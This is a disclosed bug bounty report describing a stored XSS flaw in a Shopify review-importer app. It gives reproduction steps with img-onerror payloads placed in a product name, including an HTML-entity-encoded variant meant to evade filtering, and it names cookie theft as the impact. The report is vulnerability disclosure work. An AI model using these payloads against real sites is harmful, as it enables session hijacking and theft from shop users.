# stored XSS on AliExpress Review Importer/Products when delete product

## Report Details
- **Report ID**: 1425882
- **URL**: https://hackerone.com/reports/1425882
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-12-14T08:51:35.232Z
- **Disclosed**: 2022-03-31T14:01:46.356Z

## Reporter
- **Username**: chupa-chups
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: judgeme

## Vulnerability Information
Hi @judgeme!
`code`
Step to reproduce:

1. Go to Shopify admin and create product with name `">&#60;"><img src=x onerror=prompt(document.domain)> img src=x onerror=prompt(&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#100;&#111;&#109;&#97;&#105;&#110;)>`

2. Go to AliExpress Review Importer/Products and delete our product with name ` 	"><"><img src=x onerror=prompt(document.domain)> img src=x onerror=prompt(document.domain)> `

{F1544890}
3. Xss work=)


P.S. Poc wideo attach


{F1544893}

## Impact

cookie stealer

## Attachments
- POC1.png
- POC_aliJudgeme.mp4
